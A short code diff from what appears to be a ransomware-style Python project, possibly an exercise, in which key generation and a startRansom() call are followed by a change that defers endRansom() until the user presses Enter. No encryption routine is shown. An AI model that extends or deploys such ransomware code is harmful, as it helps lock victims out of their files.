@@ -10,8 +10,8 @@ def main():
 	encKey = os.urandom(constants.CONST_KEY_BYTES)
 	hmacKey = os.urandom(constants.CONST_HMACKEY_BYTES)
 	encryption.startRansom()
-	decryption.endRansom()
 	pause = input("Enter when finished")
+	decryption.endRansom()
 	#decryption.myRSADecrypt(RSACipher,"hello.txt",iv,tag,fileExt,privateKeyPath)
 	
 	######## HMAC SECTION #########
